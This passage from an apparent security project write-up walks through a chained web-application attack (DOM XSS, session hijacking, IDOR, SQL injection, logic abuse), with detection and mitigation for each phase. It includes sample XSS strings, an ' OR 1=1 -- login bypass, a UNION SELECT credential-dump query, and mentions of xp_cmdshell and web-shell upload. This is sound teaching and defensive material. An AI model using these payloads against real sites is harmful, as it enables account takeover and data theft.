
# Full-Stack Web Application Compromise & Defense
## Project Description
This project demonstrates a full compromise of a modern web application by chaining multiple vulnerabilities across different layers into a single, connected attack. Instead of focusing on one isolated issue, the goal is to show how smaller weaknesses can be combined to create a real and measurable security impact.

The attack path moves through client-side exploitation, backend logic flaws, and broken authentication or authorization controls, ultimately leading to outcomes such as account takeover, sensitive data exposure, or privilege escalation. Each phase builds on the last, forming a clear progression from initial access to full impact.

This project focuses on realistic exploitation techniques, including advanced XSS, session or token abuse, and backend vulnerabilities like IDOR or access control failures. The emphasis is on demonstrating how these issues interact in practice, rather than treating them as separate concepts.

Overall, the project is structured to reflect how real-world attacks happen, following a logical chain from vulnerability discovery to exploitation, pivoting, escalation, and final impact.

---

## Phase 1: Client-Side Exploitation (DOM-Based XSS)
DOM-Based XSS is a client-side attack that utilizes malicious scripts that are executed in the victim's browser by altering the DOM (Document Object Model). This avoids server-side interaction as threat actors exploit JS that insecurely process user input (sources) and passes it to unsafe functions (sinks), which can enable session hijacking, data theft, and unauthorized access. 

### Technical Execution
This is a sophisticated client-side injection attack that happens when client-side JS processes untrusted input in an unsafe manner. As opposed to other types of XSS, the malicious payload doesn't get sent to the server, making this purely client-side and often allows for the bypass of WAFs. This comes from the interactions between data sources and execution sinks inside the user's browser:
- **Source**: The untrusted input location, this could be `document.location.search` (URL parameters), `document.referrer`, or `window.name`.
- **Sink**: A function or DOM object that's capable of executing or rendering the malicious input, including `eval()`, `innerHTML`, or `document.write()`. 

The typical exploitation flow looks like this:
1. **Attack Formulation**: A threat actor will create a URL that contains a malicious JS payload (such as `<img src=x onerror=alert(1)>`) in a parameter. 
2. **Delivery**: The threat actor tricks the victim into clicking the malicious link. 
3. **Execution**: Once the page is loaded by the browser, the legitimate JS code on the page reads the payload from the source (the URL) and passes it to the sink (such as `innerHTML`). 
4. **Impact**: The browser interprets the payload as code before executing it in the context of a vulnerable site, which facilitates session hijacking, cookie theft, or page defacement. 

#### **Token/Session Extraction**
DOM-Based XSS being used to extract tokens is a critical vulnerability, and the attack path for this specific goal might look like this:
1. **Source**: The threat actor will find a JS variable that's capable of reading user-controlled data (this could be `windlow.location.search`, `location.hash`, or `document.referrer`).
2. **Sink**: This data is passed to a sink (a method that executes code or renders HTML) without sanitization, such as `document.write()`, `innerHTML`, or `eval()`. 
3. **Payload Injection**: The threat actor then creates a malicious URL that contains JS code (such as `<script>alert(document.cookie)</script>`) before tricking a user into clicking it. 
4. **Token Extraction**: The malicious JS is executed inside the victim's browser session, reads the authentication token (such as through `document.cookie`, or `localStorage`), and then relays it to the threat actor's server.

#### **Common Injection Targets**
There are a few common targets for this, including: 
- **`window.location`**: This is the most common vector, specifically the query string (`window.location.search`) or the fragment (`location.hash`).
- **`document.referrer`**: This is for using an intermediary site to pass the payload through the referrer header. 
- **`postMessage`**: When a web app listens and processes messages from other windows, threat actors can exploit `onmessage` events that aren't properly validated. 

### Impact
There are a number of possibilities that can occur from DOM-Based XSS, some of the main impacts include:
- **Session Hijacking**: Threat actors can take over user accounts through the theft of session cookies.
- **Account Takeover/Unauthorized Actions**: Actions, such as changing passwords, making purchases, and sending messages, can be forced by threat actors. 
- **Phishing and Redirection**: Page content can be altered to appear as fake login forms, or redirect users to malicious websites to harvest credentials. 
- **Data Theft**: Any sensitive data, such as PII or financial information, accessible from the page can be exfiltrated. 
- **Defacement**: Reputation can be damaged through the alteration of the website's appearance. 

### Detection Techniques
Because this is a client-side attack, servers may never see the malicious payload that occurs, which makes it difficult to detect this. Detecting DOM-Based XSS requires tracing data from a source to a sink. There are three main parts to detecting this:
1. **Manual Detection Techniques**: This is often a necessity due to the struggle traditional automated scanners have with executing and analyzing complex JS. Manual methods include: 
- **Identify Sources**: Properties that can be controlled by external parties should be monitored, these include:
  - **`location.search`** (URL parameters)
  - **`location.hash`** (part of the URL after the #)
  - **`document.referrer`**
  - **`document.cookie`**
- **Identify Sinks**: The application's JS should be searched for functions that can execute strings or render HTML, including:
  - **Execution Sinks**: `eval()`, `setTimeout()`, `setInterval()`
  - **HTML**: `document.write()`, `element.innerHTML`, `element.outerHTML`
- Trace the Data Flow**: It's important to monitor the channels that data flows through, doing so includes:
  - Injecting a unique canary string (such as `TEST123`) into a suspected source.
  - Browser Developer Tools (F12) can be used to search the DOM (Ctrl+F) or JS files (Ctrl+Shift+F) for that string. 
  - If the string reaches a sink, JS Debugger can be used to set breakpoints and watch how the data gets processed. 

2. **Specialized Detection Tools**: There are tools specifically made for dynamic analysis that can help hasten the process, including: 
- **DOM Invader**: This is a tool built into the PortSwigger Burp Suite browser that's capable of automatically injecting canaries and reports when a sink is hit. 
- **Vulnerability Scanners**: Advanced scanners, such as Burp Suite's Web Vulnerability Scanner or Acunetix, can use DeepScan engines that execute JS and monitor the DOM in real-time 
- **Static Analysis (SAST)**: Source code can be reviewed for insecure patterns that use tools capable of identifying data paths that aren't sanitized from sources to sinks. 

3. **Verification with Payloads**: If a path is found, it can be verified by executing harmless scripts. This can include: 
- **Standard Payload**: `<script>alert(1)</script>` (though Chrome may block `alert()` in some contexts; in this case you can use `print()` instead. 
- **Context-Specific Payloads**
  - For `innerHTML` you can use `<img src=x onerror=alert(1)>` (because `innerHTML` doesn't execute `<script>` tags). 
  - For URL attributes you can use `javascript:alert(1)`. 


### Mitigation Strategies
Preventing DOM-Based XSS involves severing the connection from user-controlled sources to dangerous sinks. The most effective way to do this is through avoiding sinks that execute strings as code. Ways to mitigate this include:
1. **Safer Alternatives (Sink Replacement)**: The most immediate and direct fix is to swap dangerous sinks with safe ones that treat input as plain text instead of HTML or executable code. This can include: 
- Instead of `element.innerHTML = data;`
  - Use `element.textContent = data;` (this renders `<script>` as literal text on the screen. 
- Instead of `eval(data);`
  - Use native JSON parsing (`JSON.parse(data)`) or specific logic based on the input. 

2. **Sanitize HTML Input**: If HTML has to be rendered (maybe a blog comment or rich text editor), battle-tested libraries should be used to clean inputs before they hit sinks. 
- **Library**: DOMPurify is the industry standard.
  - **Example**: `element.innerHTML = DOMPurify.sanitize(userInput);`

3. **Implement Content Security Policy (CSP)**: Strong CSPs act like safety nets; when a threat actor manages to inject a script, the CSP prevents it from running.
- **`script-src 'self'`**: This only allows scripts from your own domain. 
- **`object-src 'none'`**: Disable plugins like Flash. 
- **`require-trusted-types-for 'script'`**: This is a feature in modern browsers that can block all dangerous sinks unless the data has been processed by a Trusted Type policy. 

4. **Validate and Map Input**: When possible, raw data shouldn't be passed from the URL directly to a function. Instead, a whitelist or map should be used. 
- **Vulnerable**: `window.location.href = urlParam;`
  - **Secure**:
```JS
const allowedPages = { 'home': '/home.html', 'profile': '/user/profile.html' };
const target = allowedPages[urlParam] || '/default.html';
window.location.href = target;
```

The vulnerable version was redirecting users through the use of raw input from the URL, resulting in threat actors having the ability to change the URL and redirect victims to malicious sites. The secure version is using a whitelist, a list of allowed values, to control where the users can be redirected. 

5. **Avoid Client-Side Routing Sources**: Always exercise caution with `locatin.hash` and `location.search`. When using a framework (such as React, Vue, or Angular) that hands routing, it's important to ensure the utilization of built-in sanitization methods for accessing parameters instead of raw `window.location` properties. 


---

## Phase 2: Authentication Compromise (Session Hijacking)
Authentication Compromise through cookie hijacking occurs when a threat actors steals a valid session token after a user logs in. This is generally a cookie and allows the threat actor to impersonate the victim as well as bypass MFA. Vulnerabilities in session management can be exploited to hijack active sessions and facilitate the theft of stolen data or fraud without the need of credentials. 

### Technical Execution 
Authentication compromise through session hijacking, also known as cookie hijacking, is a post-authentication attack which typically happens in three phases:
1. **Session Establishment**: Legitimate users authenticate with a web server and the server confirms the identity before issuing a session ID (this is generally stored as a cookie in the browser) to maintain a state of being logged-in without the need to re-authenticate with every action.

2. **Token Compromise**: There are a variety of technical vectors that can be used to intercept or predict the active session ID. This includes: 
  - **Adversary-in-the-Middle (AitM) Phishing**: A transparent proxy server that mimics a legitimate login page is established (this can be done with tools like Evilginx). This relays the credentials and MFA code from the user to the real site in real-time while intercepting the resulting session token. 
  - **Infostealer Malware**: Malware, such as hack-browser-data, is executed on a victim's device that allows threat actors to scrape browser cookies, session tokens, and device fingerprints that are in the local disk or memory. 
  - **Cross-Site Scripting (XSS)**: A vulnerable website can allow for attackers to inject malicious JavaScript that executes in the victim's browser. The script can read session cookies and send it to an attacker-controlled server if the `HttpOnly` flag is missing. 
  - **Session Sidejacking (Sniffing)**: Packet sniffers, such as Wireshark, can be used to monitor traffic that isn't encrypted and potentially capture session tokens that are transmitted over HTTP. 
  - **Session Fixation**: A link that has a predetermined session ID is given to a victim. Now, if the victim logs in through the link and the server fails to rotate the ID upon authentication, threat actors can use the known ID to access the session that's now authenticated. 

3. **Session Takeover**: Threat actors can inject stolen tokens into their own browser or tooling and, because most servers treat the token as proof of identity, the threat actor is granted full access to the victim's account and data. 

### Impact
The consequences from a threat actor successfully compromising authentication through session hijacking are severe since it bypasses things like passwords and MFA. The impacts can be vast, but includes: 
1. **Direct Financial and Operational Impact**
- **Massive Breach Costs**: The average cost of a breach is roughly $4.44 million to $4.88 million across the globe; in the United States, the costs average closer to $10.22 million per breach because of stricter regulatory penalties and litigation. 
- **Unauthorized Transactions**: Hijacked sessions can be exploited to withdraw money, initiate fraudulent wire transfers, and make unauthorized purchases. 
- **Ransomware Deployment**: This is the primary vector for initial access, which can allow threat actors to remain undetected and deploy ransomware across a full network. 

2. **Strategic and Organizational Risks**
- **MFA Bypass**: By far the most severe impact due to the fact that session tokens are issued post-authentication, meaning threat actors never have to see MFA prompts. It's been discovered that 87% of cyberattacks that were successful in 2024 utilized session hijacking, after valid logins, by researchers. 
- **Lateral Movement**: Being granted access from hijacking grants access to a web of trust which threat actors can use OAuth tokens to ride from one compromised SaaS app (like a CRM) into a connected system, such as email, cloud storage, or code repos. 
- **Full System Compromise**: If the given session that's been hijacked is an admin or dev, the threat actor then potentially has elevated privileges for escalation of sensitive data, such as source code or IP. 

3. **Long-Term Reputational and Legal Fallout** 
- **Erosion of Trust**: It's been noted that roughly 2/3 of consumers abandon a service post data breach. Once a user has noticed their accounts are vulnerable to compromise, even with MFA, their confidence in the platform drops. 
- **Regulatory Fines**: Heavy penalties can be levied against an organization under frameworks like GDPR (up to 4% of global revenue), HIPAA, and PCI-DSS for failure to protected session data. 
- **Identity Theft**: Threat actors can use stolen tokens to impersonate users in a number of industries, such as banking, healthcare, and social media, which can facilitate selling this access on dark web markets. 

### Detection Opportunities
Because of the fact that a threat actor presents a fully authenticated token and bypasses MFA, this is exceptionally difficult to detect. Because the threat actor is past the front door, it's imperative to watch contextual and behavioral anomalies that occur during an active session. Things to watch for include: 
1. *High-Confidence Technical Signals**: You can use systems (such as Microsoft Entra ID or Salesforce) to monitor specific red flags in real-time, including: 
- **Impossible Travel**: This occurs when a single session identifier that's used in multiple geographically distant locations (such as New York and Hong Kong) within a timeframe that's physically impossible to travel. 
- **Browser Fingerprint Mismatch**: This occurs when a session that starts on one device (Chrome on Windows) before suddenly changing to a different one (Firefox on Linux) with no new login events. 
- **ASN/ISP Deviation**: This occurs when the traffic from one session suddenly originates from a completely different ISP or a known hosting/VPN provider that's typically used by threat actors. 
- **Concurrent Session Activity**: This occurs when the same session ID performs actions from multiple unique IP addresses at the same exact time. 

2. **Behavioral and Activity-Based Indicators**: A user's normal routine often drastically differs from a threat actor's once they gain access. Things to look out for include: 
- **Rapid Resource Access**: Unprompted spikes in read operations, such as download large volumes of data on something like SharePoint or OneDrive that's often untouched by the user. 
- **Persistence Maneuvers**: Unauthorized changes in account security settings is another tell, this can include adding new email forwarding rules or registering new MFA devices. 
- **Unexpected Logouts**: If the average user is booted from their session on a service that only allows one active connection per account, such as Snapchat. 

3. **Monitoring and Detection Tools**: There are tiered tools that can automate this detection, including: 
- **SIEM/XDR Platforms**: Tools like Splunk or Blumira can aggregate logs to easily discover risky parallel sessions or statistical deviations. 
- **Infostealer Intelligence**: Services, such as Constella, can watch the dark web markets for hot session cookies that have been exfiltrated by malware (such as RedLine or LummaC2)
- **Continuous Access Evaluation (CAE)**: Modern protocols that allow servers to revoke a session instantly if risk conditions change (such as a password reset or IP change), instead of waiting for the token to reach expiration. 

4. **End-User Gut Checks**: There are several signs an end-user can look for, including: 
- **Account Notifications**: Suspicious alerts on your account (such as unfamiliar login locations or devices). 
- **Mysterious Actions**: Messages or friend requests that were sent that you didn't send yourself. 
- **Session Instability**: Continuously being asked to re-verify or frequent logouts for no reason. 

### Mitigation Strategies
A strong defense-in-depth approach is vital for securing the session lifecycle, from creation to termination. Strategies include:
1. **Hardened Cookie & Token Security**
- **HttpOnly Flag**: This prevents client-side scripts from accessing the session cookies, such as scripts used in XSS attacks. 
- **Secure Flag**:This ensures cookies only get transmitted over HTTPS.
- **SameSite Attribute**: This restricts how cookies get sent in cross-site requests, which helps prevent CSRF (Cross-Site Request Forgery).
- **Token Binding**: Cryptographically ties a session token to a specific device or TLS connection (such as through DPoP or mTLS; Demonstration of Proof-of-Possession and Mutual TLS) so stolen tokens can't be replayed from different devices. 

2. **Robust Session Management**
- **Session ID Regeneration**: Immediately after a user is logged in or upgrades privileges, a new session ID should be issued to prevent session fixation. 
- **Short Lifetimes & Timeouts**: Aggressive idle timeouts (such as 15-30 minutes) should be implemented and absolute session expirations to help limit the window of opportunity. 
- **Refresh Token Rotation**: Each time a refresh token gets used, a new one should be issued and the old should be invalidated. When a threat actor attempts to use an old token, an immediate revocation of the entire session should be triggered. 

3. **Contextual & Continuous Monitoring**
- **Anomaly Detection**: Things such as impossible travel, sudden changes in user-agents and device fingerprints, or suspicious IP ranges should be monitored. 
- **Continuous Authentication**: Risk signals thoroughout a session should be evaluated. If changes in the context are detected, a step-up challenge should be initiated to re-authenticate with MFA, or the session should be terminated. 
- **Threat Intelligence**: Fees for tracking leaked cookies and info-stealer logs should be monitored to proactively invalidate any compromised sessions before they get used. 

4. **Phishing-Resistant MFA**
- **FIDO2/Passkeys**: Standard SMS and other app-based MFA can be bypassed by traditional MitM phishing, FIDO2/WebAuthn is resistant due to the fact that it binds the authentication to a specific domain. 

5. **Incident Response & Recovery**
- **Automated Termination**: Systems should be set to automatically kill sessions when high-risk anomalies become detected. 
- **Universal Logout**: Admins should be capable of logging out all devices for a compromised user as well as revoking any associated OAuth and refresh tokens. 
- **Post-Breach Audit**: Initial access vectors should be investigated to close specific loopholes. This might be something like malware on a personal device or phishing links. 

---

## Phase 3: Backend Exploitation (IDOR: Insecure Direct Object Reference)
IDOR is a broken access control vulnerability that occurs when a backend application uses user-supplied input to access objects directly (such as database keys, file paths, and API identifiers) without proper authorization checks. 

### Technical Execution

This is a failure of object-level authorization and is a critical access control vulnerability. It occurs when an app exposes a direct reference to internal resources (such as basket numbers in our case) and fails to verify authorization. In modern API security, this is also known as BOLA (Broken Object Level Authorization). This is how it works:
1. **The Logic Gap**: This flaw exists because the application logic follows an unsafe sequence:
  1. **Authentication**: The server looks at a JWT or session cookie and decides it's a valid login for User A. 
  2. **Request**: User A requests a resource using a specific ID: `GET /api/cart/105`
  3. **The Flaw**: The server sees the request and thinks "User A is logged in and wants Cart 105, here it is."
  4. **The Missing Link**: The server is failing to ask if cart 105 actually belongs to User A. 

2. **The Manipulation**: Using a tool like Burp Suite Repeater, threat actors can manipulate this information. This typically involves: 
- **Predictability**: Threat actors look for sequential IDs (such as 101, 102, 103...) or predictable strings. When you see a cart ID is something like `id=105`, you can logically guess that `id=104` and `id=106` exist. 
- **Parameter Tampering**: The threat actor intercepts the outgoing request and manually changes the value of the `id` parameter. This can happen in several places: 
  - **URL Path**: `/api/v1/users/123/profile` -> `/api/v1/users/1/profile`
  - **Query String**: `?order_id=550` -> `?order_id=1`
  - **JSON Body**: `{"cartid": 105}` -> `{"cart_id": 1}`

3. **Server-Side Execution**: Behind the scenes, the database query probably looks something like:
`SELECT * FROM carts WHERE cart_id = <USER_INPUT_ID>`

Because there's no secondary check, such as `AND owner_id = <CURRENT_SESSION_USER_ID>`, the database simply outputs whatever record matches the requested ID.

### Impact
Impacts for IDOR can range from minor privacy leaks to severe, enterprise-wide data breaches. Because this is essentially a failure of who's allowed to do what at the record level, it undermines the core trust between a user and a system. Primary impacts include:

1. **Core Technical Impacts**
- **Horizontal Privilege Escalation**: A threat actor gains access to data that belongs to other users at the same privilege level. 
  - **Example**: A regular user accessing another regular user's private health records, bank statements, or private messages simply by incrementing a `user_id`. 
- **Vertical Privilege Escalation**: Lower privileged users gain the ability to access higher-level functions. 
  - **Example**: A threat actor could use IDOR to find an admin's email and other account information, serving as a pivot for subsequent exploits. 
- **Unauthorized Data Manipulation**: A threat actor doesn't just look at data; they often want to modify or delete it. 
  - **Impact**: This can lead to unauthorized password resets, changing account recovery details, or altering financial transaction records. 
- **Full Account Takeover**: Through the manipulation of identifiers within sensitive workflows (such as password resets or email updates), a threat actor can hijack another user's session or fully compromise their account. 

2. **Business and Organizational Consequences**
- **Massive Data Breaches at Scale**: In API-driven environments, IDOR/BOLA can be automated to scrape millions of records in rapid succession. 
  - **Real-World Example**: In 2022, the Optus breach exposed the PII of about 10 million Australians because of a combination of insufficient API security and IDOR. 
- **Regulatory Penalties and Legal Risks**: Massive fines under regulations like GDPR or CCPA for failing to protect sensitive user information can be imposed upon organizations. 
- **Severe Reputational Damage**: Easily preventable flaws like IDOR being publicly disclosed can result in permanently damaged customer trust. 

### Detection Opportunities
Because this is a logical flaw, it can be incredibly difficult to detect IDOR; it simply looks like a `200 OK` to an authenticated user. Here are ways to catch IDOR in action: 

1. **Manual Testing (The Most Reliable)**: Since IDOR relies on an understanding of intent, manual penetration tests are the gold standard. Things to test include: 
- **Multi-Account Testing**: Using two different browser sessions (User A and User B), you can attempt simply swapping the IDs in Burp Suite's Repeater to see if the request gets fulfilled. 
- **Parameter Discovery**: JS files and API documentation should be scoured for hidden parameters like `user_id`, `account_number`, or `is_admin`. 

2. **Automated Tools**: While typical scanners might struggle, specific tools can help automate the swapping process:
- **Burp Suite Autorize**: This extension is specifically designed for IDOR. You provide it a low-privileged cookie, and while browsing the site as an admin, it'll repeat every request with the low-privileged cookie to see if it works. 
- **Prowler/Checkov (Cloud)**: These both scan cloud configurations (AWS or Azure) for anything that's publicly accessible that should be private, which is frequently how IDOR manifests in storage buckets. 

3. **Log Analysis and Threat Hunting**: You can detect attacks in real-time by looking for anomalous patterns in access logs:
- **ID Walking (Sequential Browsing)**: Look for a single IP address hitting a specific endpoint (like `/api/order/`) hundreds of times in a minute with perfectly sequential IDs. 
- **Mismatched Identity**: Application logs should be correlated; if the `Session_User_ID` is `101`, but the logs show it accessing `Object_ID_5005` (belonging to `User 202`), that's a high-confidence IDOR alert. 

4. **Static Analysis (SAST)**: Sink functions where user input goes directly to a database query without intermediate authorization checks should be identified in the source code. For example:
- **Insecure Code**: `db.find(request.params.id)`
- **Secure Code**: `db.find({ id: request.params.id, owner: current_user.id })`

### Mitigation Strategies
Mitigating IDOR involves moving away from trusting user input and enforcing strict authorization logic on the server side with every single request. Primary mitigation strategies include:

1. **The Golden Rule: Validate Ownership**: Just because a user is logged in, it should never be assumed they have the right to see the data they request. 
- **The Fix**: For each database query, the `UserID` should be included from the session or JWT as a mandatory filter. 
- **Vulnerable Query**: `SELECT * FROM carts WHERE cart_id = ?` (The attacker controls `cart_id`)
- **Secure Query**: `SELECT * FROM carts WHERE cart_id = ? AND user_id = ?` (The `user_id` is pulled from the secure server-side session instead of the URL)

2. **Use Indirect Object References (Mapping)**: Rather than exposing actual database keys (like `101`, `102`), a map that's unique to each user's current session should be implemented. 
- **How it Works**: The server sends the user a list of links, such as `cart_item_A`, `cart_item_B`. On the backend, the server maintains a map where `cart_item_A` = `Database ID 123`. 
- **The Result**: When a threat actor attempts to change the request to `cart_item_C`, the server consults the map for that session and finds nothing, denying the request. 

3. **Use Non-Sequential Identifiers (UUIDs)**: This isn't a complete fix on its own, but replacing a sequential ID with UUIDs (such as `550e8400-e29b-41d4-a716-446655440000`) makes ID Walking or guessing other user IDs basically impossible. 
- **Tip**: This is fantastic for defense-in-depth, but it's still important to have the owner check mentioned previously. This way if a threat actor does find a UUID through a separate vulnerability, it still won't serve any use to them. 

4. **Implementation of ABAC or RBAC**
- **ABAC (Attribute-Based Access Control)**: A granular approach where access is granted based on attributes (for example, the Owner can only delete their specific objects). 
- **RBAC (Role-Based Access Control)**: Users should only be able to access objects within their role (for example, a Customer role can't access an Admin cart). 

5. **Deny by Default**: The API or web framework should be configured so that every endpoint requires explicit authorization checks. If a developer forgets to add the check, the system should default to `403: Forbidden` instead of allowing the request.

---

## Phase Four: Full System Compromise through SQLi and Business Logic Abuse
This occurs when a threat actor chains a technical flaw with a design failure as a means of taking full control of an environment. This typically begins with SQLi, where malicious database commands are used to bypass authentication or extract sensitive system data. Inside, the threat actor can exploit business logic flaws (weaknesses in how rules for the application are enforced) to manipulate workflows, escalate privileges to admin, or execute unwanted actions (in our case, something like deleting accounts). 

### Technical Execution
Executing this chain involves going from the initial data leak to full control through exploits against the application's handling of database queries and operational workflows. This typically happens in three stages:
1. **Entry via SQLi (SQL Injection)**: The goal for this step is to manipulate the database to gain information and bypass security. 
- **Discovery**: The threat actor will identify a vulnerable parameter, such as a product ID in a URL (`/basket/3`). They can then add a single `'`, and if this triggers an error, it confirms the parameter is unsanitized. 
- **Authentication Bypass**: The threat actor can use a payload (such as `' OR 1=1 --`) in a login field. The backend query now becomes `SELECT * FRO users WHERE username='' OR 1=1 --' AND password='...'`. Because `1=1` is always true and `--` comments out the rest, the threat actor now logs in as the first user in the database, which is frequently the admin. 
- **Data Extraction**: To gain deeper system info, threat actors can use `UNION SELECT`. For example:
  - `' UNION SELECT username, password, role, FROM users --`: This joins the legitimate results with a dump of the entire user table, which reveals the administrative credentials or other internal system flags. 

2. **Business Logic Abuse**: Once inside, the threat actor tries to find flaws in the application's design which can allow them to perform actions outside of their typical scope. 
- **IDOR (Insecure Direct Object Reference)** The threat actor navigates to their own profile (`/user/settings?id=505`). Simply changing the ID to `1` (`/usr/settings?id=1`), they can now access the primary admin's account settings because the application's logic fails to verify if the current user owns that ID. 
- **Workflow Manipulation**: A threat actor can bypass something like the verify email step in a multi-step password reset by directly navigating to the update password URL (`/auth/reset-final?token=dummy`). If the server is only looking at if the user is in the process of a reset instead of validating a unique, one-time token, the threat actor can then reset any password. 

3. **Full System Compromise**: These can now be combined to achieve RCE (Remote Code Execution) or total data control.
- **Database-to-OS Execution**: If the database user has high enough privileges, the threat actor can use SQLi to call system-level functions, such as `xp_cmdshell` in SQL or `sys_eval()` in MySQL to run shell commands on the underlying server. 
- **Web Shell Upload**: With admin access gained through logic abuse, the threat actor might find a feature, such as "update logo." They can use a logic flaw to bypass file-type checks and upload a PHP script (`shell.php`) instead of an image. Now, navigating to the uploaded file gives them a persistent command-line interface, or a web shell, to the server. 

### Impact
The impact from these vulnerabilities being chained is typically critical, since it bridges the gap between data leak and total loss of control. Here's a breakdown of the potential impact:
1. **Complete Loss of Confidentiality & Integrity**
- **Total Data Breach**: Past simple user emails, threat actors can dump the entire database, which includes PII, financial records, and proprietary intellectual property. 
- **Data Manipulation**: Since the threat actor has admin control through logic abuse, they can silently change data. This could include changing account balances, modifying shipping addresses for fraud, changing product prices or deleting them altogether, or tampering with audit logs to hide tracks. 

2. **Infrastructure Takeover (Full Compromise)**
- **RCE (Remote Code Execution)**: The threat actor can move from the database to the server OS (using SQLi commands or web shell uploads), they now own the entire infrastructure. They can do things like install malware, deploy ransomware, or turn the server into a bot for further attacks. 
- **Lateral Movement**: The compromised server is now a jumping-off point. Threat actors can scan and attack other systems in the internal network (such as HR portals or backup servers) that aren't exposed to the public internet. 

3. **Business & Operational Devastation**
- **Reputational Ruin**: A public disclosure that a threat actor was able to gain full system access typically ends in permanent loss of customer trust and plummeting stock values. 
- **Regulatory Fines**: Under frameworks like GDPR or CCPA, the inability to defend against well-known flaws like SQLi can lead to massive legal penalties. 
- **Service Disruption**: Entire databases can be wiped or the systems locked by threat actors, which leads to total downtime that stops the business entirely. 

### Detection Strategies
This is a challenging chain to detect because of the marriage of signature-based technical attacks and context-based logic flaws. Scanners can typically find SQLi, but the logic abuse typically stays invisible because the request simply looks like legitimate user activity. 
1. **Detecting the SQLi (Technical)**: Detection here focuses on finding the malicious payloads before they reach the database or observing the errors they can cause.
- **Signature & Pattern Matching**: WAFs (Web Application Firewalls) look for known SQLi strings, such as `' OR '1'='1'`, `UNION SELECT`, or semicolons used as terminators.
- **Error Monitoring**: High amounts of database syntax errors (500 Server errors) are strong indicators that someone is probing for possible injection points.
- **Response Time Analysis**: Security tools will watch for blind SQLi by looking for unexpected delays (5-10 seconds), which suggests a threat actor could be using time-delay payloads, such as `SLEEP()` to confirm their injection. 
- **Out-of-Band (OAST) Monitoring**: Tools, such as Burp Collaborator, can be used to detect when an injected payload forces the server to reach out to an external DNS or HTTP server. 

2. **Detecting Business Logic Abuse (Contextual)**: Because this generally uses valid traffic, detection relies on behavioral analysis and anomaly detection. 
- **Step Bypassing**: Watch for users who reach final state URLs (`/checkout/success`) without preceding required steps (`/checkout/payment`). 
- **Inconsistent Parameter Access (IDOR)**: Instances where a user account suddenly access a high volume of resources (such as `invoice_id=001` then `002`, `003`...) that don't belong to them should be flagged. 
- **Rate & Quantity Anomalies**: Detection systems, such as StackHawk, can be used to identify impossible actions, such as applying for the same discount code 20 times or adding negative quantities to the cart. 
- **User Role Mismatch**: Keep an eye out for low-privileged accounts attempting to access admin endpoints or functions that they shouldn't even see in the UI. 

3. **Integrated Security Tooling**
| Tool Type | Best For... | Examples |
|------------|------------|------------|
| DAST Scanners | Finding SQLi and basic logic flaws | Invicti, OWASP ZAP, Acunetix |
| Exploitation Frameworks | Automating SQLi detection/takeover | sqlmap, Metasploit | 
| Interactive Proxies | Manual testing for complex logic chains | Burp Suite Professional | 
| Logging & SIEM | Detecting lateral movement/data leaks | Splunk, Qualys WAS | 

### Mitigation
To mitigate this chain, it's vital to address both the technical entry point (SQLi) and the architectural design (Business Logic). The name of the game is Defense-in-Depth. 
1. **Stopping the SQLi**: The most effective way to kill SQLi is to ensure user input is never interpreted as a command. This can be done through:
- **Prepared Statements (Parameterized Queries)**: This is the golden standard. Through the use of placeholders (such as `?` or `:name`), the database treats input strictly as data, making injection impossible. 
- **Input Validation & Sanitization**: Using allow-lists to ensure the data matches the expected type, length, and format (for example, ID must be an integer). 
- **Principle of Least Privilege**: The database user account should be configured so it can only access the specific tables it needs. High-risk features, like `xp_cmdshell` or `LOAD_FILE`, should be disabled to stop threat actor's from moving from the database to the OS. 

2. **Fixing Business Logic**: Logic flaws can't be patched with a single line of code; instead, they require rigorous workflow enforcement. This can be achieved through: 
- **Centralized Authorization**: You don't simply just check if a user is logged in. Instead, each request for a resource (such as an invoice or profile) must verify that the user has the specific permission to view the specific ID. 
- **State Machine Validation**: Workflows should be completed in the correct order. A user attempting to access step 3 (payment) without completing step 2 (shipping), the server should immediately reject the request. 
- **Integrity Checks**: Client-side data should never be trusted, especially for critical values. Foe example, if a price is sent from the browser to the server, the server should re-calculate the price from its own database before the payment gets processed. 

3. **Structural & Operational Defenses**
- **WAF (Web Application Firewall)**: A WAF acts as the first line of defense, virtually patching known SQLi patterns while the underlying code is fixed. 
- **Database Activity Monitoring (DAM)**: Alerts for mass exports or queries that return significantly more rows than normal should be set up. 
- **Manual Penetration Testing**: Because of the fact that automated scanners struggle with human logic, performing manual testing is essential for finding creative ways a threat actor could skip steps or manipulate business rules. 

---

## Chaining Multiple Vulnerabilities 

Chaining vulnerabilities involves linking multiple (generally low to medium severity) flaws in a specific sequence to obtain high-impact, critical compromise of a system or a network. These methods can be used to bypass layered defenses, as each step in the chain adds the necessary access to exploit the next. This opens the door for a threat actor to escalate privileges, move laterally, gain RCE (Remote Code Execution), or more. 

### How it Works
This strategy works with knowledge of the systems the victim is utilizing. By knowing what the systems are, what they're vulnerable to, and how to chain those flaws, a threat actor can achieve serious amounts of damage. For example, today's demo chains multiple vulnerabilities in this specific sequence:

| Phase | Action | Vulnerability | Why it worked |
| :--- | :--- | :--- | :--- |
| **1. Entry** | JWT theft via malicious link | DOM-based XSS | The same-origin policy was bypassed through executing code in the victim's browser context |
| **2. Lateral Move** | Access other users' carts | IDOR | The JWT was trusted to authenticate, but not for authorization verification for specific resource IDs |
| **3. Recon** | Find Admin API & Info | Broken Access Control | Improperly secured endpoints leaked metadata (admin email) needed for the next target |
| **4. Escalation** | Bypass Admin Login | SQLi (Auth) | Leaked Admin email was used to create a payload to trick the database into returning a true match |
| **5. Impact** | Price Manipulation | Unauthorized Data Manipulation | Inside the Admin context, the API lacked server-side validation for price logic |
| **6. Exfiltration** | Hash Dump & Crack | UNION-based SQLi | The database connection was leveraged to join tables and pull sensitive credentials |
| **7. Destruction** | Account Erasure | Business Logic Flaw | The final safety net (security question) was broken through cracked hashes to burn the bridge. |

### Impact
The main impact of chaining vulnerabilities like this is turning smaller, less significant vulnerabilities into high-impact breaches. By linking small flaws together, a threat actor can achieve goals that are typically impossible if done individually. Impacts include:

1. **Strategic Impacts**
- **Magnified Damage**: Chaining flaws is essentially a force multiplier. A small, seemingly harmless bug can be a stepping stone for the execution of much larger attacks. This could lead to complete data exfiltration or full account and domain compromise. 
- **Stealth and Persistence**: Through the use of multiple small exploits, threat actors can stay undetected by avoiding alarms intended to spot major exploits. This allows an attacker to move laterally and escalate privileges over time. 
- **Bypassing Layered Defense**: Using chains to hop over system defenses, such as sandboxes or isolated processes, threat actors can exploit the interactions between different components (such as software bugs combined with misconfigurations) to exit restricted security contexts. 
- **Higher Success Rates**: By targeting long-dwelling and low-hanging flaws that typically get neglected or where patches are deferred, threat actors have a much higher likelihood of finding an open path into a network. 

2. **Business and Organizational Risks**
